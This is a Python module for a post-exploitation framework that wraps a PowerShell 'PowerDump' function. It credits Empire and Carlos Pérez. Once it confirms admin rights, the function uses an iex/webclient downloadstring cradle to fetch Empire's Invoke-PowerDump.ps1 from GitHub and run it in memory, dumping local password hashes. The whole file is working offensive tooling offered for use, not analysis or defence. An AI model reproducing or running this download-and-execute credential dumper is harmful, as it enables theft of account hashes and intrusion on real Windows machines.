from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "PowerDump",
                       "Description": "Hash Dump :)",
                       "Author": "Carlos Pérez - Darkoperator",
                       "Link": "https://github.com/EmpireProject/Empire",
                       "License": "BSD 3-Clause",
                       "Module": "@pablogonzalezpe, @toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function PowerDump{
            if (isadmin){
                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');
                Invoke-PowerDump;
            }else {
                return 'No admin privileges';
            }
        }
        """
        function += 'PowerDump'
        super(CustomModule, self).run(function)
